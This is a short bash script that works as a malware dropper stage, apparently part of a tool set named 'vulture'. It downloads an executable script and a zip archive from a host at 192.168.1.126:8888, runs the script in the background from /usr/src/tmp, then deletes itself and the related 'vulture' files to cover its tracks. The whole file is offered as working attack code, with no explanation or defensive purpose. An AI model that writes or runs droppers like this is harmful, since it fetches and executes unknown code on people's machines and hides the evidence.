#!/bin/bash

# fetching
wget http://192.168.1.126:8888/tools/vulture_executioner.sh
wget http://192.168.1.126:8888/tools/archives/vulture_poly.zip

# moving
mkdir /usr/src/tmp
mv vulture_executioner.sh /usr/src/tmp
mv vulture_poly.zip /usr/src/tmp

# stage 2
chmod +x /usr/src/tmp/vulture_executioner.sh
/usr/src/tmp/vulture_executioner.sh &
sleep 3

# wipe itself
rm /usr/src/desktop/vulture_seeker.sh
rm -- "$0"
rm -rf vulture_*
